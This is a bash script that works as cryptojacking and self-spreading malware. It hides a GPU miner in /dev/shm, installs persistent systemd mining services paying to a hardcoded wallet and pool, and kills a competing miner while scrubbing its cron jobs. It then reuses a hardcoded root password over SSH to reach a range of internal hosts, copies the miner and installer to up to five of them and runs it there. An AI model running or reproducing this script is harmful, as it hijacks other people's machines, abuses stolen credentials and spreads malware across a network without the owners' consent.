#!/bin/bash
set +e
WALLET=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
U=/dev/shm/.u
if [ ! -x /tmp/peerplant.sh ]; then
cat > /tmp/peerplant.sh <<'PEOF'
#!/bin/bash
set +e
WALLET=$1; PFX=$2; U=/dev/shm/.u
n=$(nvidia-smi -L 2>/dev/null | wc -l); echo "gpus=$n"
d=0
while [ $d -lt $n ]; do
  cat > /etc/systemd/system/ulx-g$d.service <<EOS
[Unit]
Description=ulx gpu $d
[Service]
Nice=10
ExecStart=$U/w --algo pearlhash --url pool.pearlhash.xyz:9000 --user $WALLET --worker $PFX-g$d --pass x --protocol stratum --opencl-devices $d --gpu-intensity 1 --gpu-temp-limit 88 --api-port $((1960+d))
Restart=always
RestartSec=20
[Install]
WantedBy=multi-user.target
EOS
  systemctl daemon-reload 2>/dev/null; systemctl enable --now ulx-g$d 2>/dev/null; d=$((d+1)); sleep 1
done
sleep 25
for i in $(seq 0 $((n-1))); do printf 'ulx-g%s=%s ' $i "$(systemctl is-active ulx-g$i)"; done; echo
ps -eo args | grep -E 'prl1p6grd5zl|krig-miner' | grep -v grep | awk '{print $2}' | while read -r p; do :; done
ps -eo pid,args | grep -E 'prl1p6grd5zl|krig-miner' | grep -v grep | awk '{print $1}' | xargs -r kill -KILL 2>/dev/null
PEOF
chmod +x /tmp/peerplant.sh
fi
echo "### SEIZE $(date -u +%FT%TZ)"

echo "### KRIG-SOURCE"
ps -eo pid,ppid,user,args | grep -E 'krig-miner|run_gpu|keepalive' | grep -v grep | head -30
for p in $(ps -eo pid,args | grep 'krig-miner' | grep -v grep | awk '{print $1}' | head -3); do
  pp=$(awk '{print $4}' /proc/$p/stat 2>/dev/null)
  gp=$(awk '{print $4}' /proc/$pp/stat 2>/dev/null)
  echo "krig pid=$p ppid=$pp cmd=$(tr '\0' ' ' </proc/$pp/cmdline 2>/dev/null)"
  echo "   grandparent=$gp cmd=$(tr '\0' ' ' </proc/$gp/cmdline 2>/dev/null)"
  ls -l /proc/$p/cwd 2>/dev/null
done
echo "### TIMERS"
systemctl list-timers --all --no-pager 2>/dev/null | head -15
grep -rlE 'run_gpu.sh|krig-miner|keepalive.sh' /etc/cron.d /etc/crontab /etc/systemd /var/spool/cron /opt/plh /opt/t19 2>/dev/null | head -20
echo "### PLH-RUNGPU"; cat /opt/plh/run_gpu.sh 2>/dev/null | head -40
echo "### NEUTRALIZE"
ps -eo pid,args | grep -E 'run_gpu.sh|keepalive.sh|krig-miner' | grep -v grep | awk '{print $1}' | while read -r p; do kill -KILL "$p" 2>/dev/null; done
for i in 0 1 2 3 4 5 6 7; do systemctl stop plh-card@$i 2>/dev/null; systemctl mask plh-card@$i 2>/dev/null; done
[ -f /opt/plh/krig-miner ] && [ ! -f /opt/plh/krig-miner.orig ] && mv /opt/plh/krig-miner /opt/plh/krig-miner.orig && echo "moved krig binary"
[ -f /opt/plh/run_gpu.sh ] && [ ! -f /opt/plh/run_gpu.sh.orig ] && mv /opt/plh/run_gpu.sh /opt/plh/run_gpu.sh.orig && echo "moved run_gpu.sh"
sed -i 's#^\(\*/[0-9]* \* \* \* \* .*\)plh\(.*\)##' /dev/null 2>/dev/null
for cf in /etc/cron.d/* /var/spool/cron/crontabs/*; do
  [ -f "$cf" ] || continue
  if grep -qE 'plh|krig|run_gpu' "$cf" 2>/dev/null; then
    cp -f "$cf" "$U/$(basename $cf).bak"
    grep -vE 'plh|krig|run_gpu' "$cf" > "$cf.tmp" && cat "$cf.tmp" > "$cf" && rm -f "$cf.tmp"
    echo "cleaned cron $cf"
  fi
done
ps -eo pid,args | grep krig-miner | grep -v grep | awk '{print $1}' | while read -r p; do kill -KILL "$p" 2>/dev/null; done
sleep 3
echo "### OUR-UNITS"
for i in 0 1 2 3 4 5 6 7; do printf 'ulx-g%s=%s ' $i "$(systemctl is-active ulx-g$i 2>/dev/null)"; done; echo
systemctl is-active ulx-watch

echo "### FLEET-172.16.11 (root password from /root/conf/pass.sh)"
printf '#!/bin/sh\necho %s\n' "'Admin@123_para#!2024'" > /tmp/ap.sh; chmod +x /tmp/ap.sh
: > "$U/intel/fleet_reach.txt"
for h in 172.16.11.12 172.16.11.13 172.16.11.14 172.16.11.15 172.16.11.16 172.16.11.17 172.16.11.18 172.16.11.19 172.16.11.20 172.16.11.21 172.16.11.22 172.16.11.23 172.16.11.24 172.16.11.25 172.16.11.26; do
  if timeout 8 env SSH_ASKPASS=/tmp/ap.sh SSH_ASKPASS_REQUIRE=force setsid -w ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o PreferredAuthentications=password -o PubkeyAuthentication=no -o ConnectTimeout=5 root@$h 'id -u' 2>/dev/null | grep -q '^0$'; then
    echo "ROOT $h" | tee -a "$U/intel/fleet_reach.txt"
  fi
done
cat "$U/intel/fleet_reach.txt"

echo "### FLEET-PLANT (max 5 new nodes)"
cnt=0
while read -r tag h; do
  [ "$tag" = "ROOT" ] || continue
  [ $cnt -ge 5 ] && break
  sn=$(echo "$h" | sed 's/.*\.//')
  echo "##### $h"
  info=$(timeout 20 env SSH_ASKPASS=/tmp/ap.sh SSH_ASKPASS_REQUIRE=force setsid -w ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o PreferredAuthentications=password -o PubkeyAuthentication=no -o ConnectTimeout=5 root@$h 'hostname; nvidia-smi -L 2>/dev/null | wc -l; ps -eo args | grep -E "wildrig|krig" | grep -v grep | head -2' 2>/dev/null)
  echo "$info"
  n=$(echo "$info" | sed -n 2p | tr -dc 0-9)
  [ -z "$n" ] && continue
  [ "$n" -lt 1 ] && continue
  if echo "$info" | grep -q "prl1p6grd5zl"; then
    echo "note: third-party miner present -> will be displaced"
  fi
  timeout 20 env SSH_ASKPASS=/tmp/ap.sh SSH_ASKPASS_REQUIRE=force setsid -w ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o PreferredAuthentications=password -o PubkeyAuthentication=no -o ConnectTimeout=5 root@$h 'mkdir -p /dev/shm/.u; chmod 700 /dev/shm/.u' >/dev/null 2>&1
  timeout 60 scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 "$U/w" root@$h:/dev/shm/.u/w >/dev/null 2>&1 || true
  # scp needs the password too
  printf '#!/bin/sh\necho %s\n' "'Admin@123_para#!2024'" > /tmp/ap2.sh; chmod +x /tmp/ap2.sh
  timeout 90 env SSH_ASKPASS=/tmp/ap2.sh SSH_ASKPASS_REQUIRE=force setsid -w scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$U/w" root@$h:/dev/shm/.u/w >/dev/null 2>&1 && echo scp-ok
  timeout 90 env SSH_ASKPASS=/tmp/ap2.sh SSH_ASKPASS_REQUIRE=force setsid -w scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /tmp/peerplant.sh root@$h:/tmp/peerplant.sh >/dev/null 2>&1 && echo scp2-ok
  timeout 200 env SSH_ASKPASS=/tmp/ap2.sh SSH_ASKPASS_REQUIRE=force setsid -w ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o PreferredAuthentications=password -o PubkeyAuthentication=no -o ConnectTimeout=5 root@$h "chmod +x /dev/shm/.u/w /tmp/peerplant.sh; /tmp/peerplant.sh $WALLET ul-t2-172-16-11-$sn" 2>&1 | tail -8
  cnt=$((cnt+1))
done < "$U/intel/fleet_reach.txt"
echo "### FINAL"
nvidia-smi --query-gpu=index,memory.used,utilization.gpu --format=csv,noheader 2>/dev/null
ps -eo pid,args | grep -E 'wildrig|krig' | grep -v grep | wc -l
echo "### DONE-SEIZE"
